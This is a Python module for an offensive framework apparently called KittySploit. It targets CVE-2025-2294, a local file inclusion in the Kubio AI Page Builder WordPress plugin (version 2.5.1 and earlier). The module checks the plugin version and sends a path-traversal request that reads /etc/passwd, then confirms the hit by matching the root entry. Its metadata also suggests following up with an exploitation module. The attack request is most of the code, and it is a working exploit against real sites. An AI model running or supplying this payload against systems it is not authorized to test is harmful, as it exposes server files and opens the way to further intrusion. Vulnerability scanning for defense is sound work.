#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kubio AI Page Builder <= 2.5.1 LFI (CVE-2025-2294)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "kubio"
_VULN_HIGH = (2, 5, 1)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Kubio CVE-2025-2294 LFI detect",
        "description": (
            "Detects CVE-2025-2294 via __kubio-site-edit-iframe-classic-template path traversal "
            "to /etc/passwd."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-2294",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2025-2294",
            "https://github.com/Nxploited/CVE-2025-2294",
        ],
        "modules": ["auxiliary/admin/http/kubio_cve_2025_2294_lfi"],
        "tags": ["web", "scanner", "wordpress", "kubio", "lfi", "cve-2025-2294"],
        "agent": {
            "chain": {"suggested_followups": ["auxiliary/admin/http/kubio_cve_2025_2294_lfi"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        if not home or "/plugins/kubio" not in (home.text or ""):
            return False
        r = self.http_request(
            method="GET",
            path=self._join("/"),
            params={
                "__kubio-site-edit-iframe-preview": "1",
                "__kubio-site-edit-iframe-classic-template": "../../../../../../../../etc/passwd",
            },
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        if re.search(r"root:.*:0:0:", r.text or ""):
            self.set_info(
                severity="critical",
                reason="Kubio CVE-2025-2294 LFI confirmed (/etc/passwd)",
                path="/",
                cve="CVE-2025-2294",
            )
            return True
        return False
